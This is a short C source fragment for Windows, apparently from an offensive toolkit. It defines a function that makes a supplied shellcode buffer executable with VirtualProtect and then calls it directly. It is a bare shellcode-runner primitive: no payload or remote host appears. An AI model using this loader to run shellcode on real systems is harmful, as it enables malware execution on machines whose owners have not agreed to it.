#include <stdio.h>
#include <windows.h>


void bind_shellcode(unsigned char *shellcode) {
	#ifdef PRINT_DEBUG
		printf("exec_shellcode64\n ");
		int size=strlen(shellcode);
		printf("shellcode size: %d\n", size);
	#endif

	int len=strlen(shellcode);
	DWORD l=0;
	VirtualProtect(shellcode,len,PAGE_EXECUTE_READWRITE,&l);
	(* (int(*)()) shellcode)();
}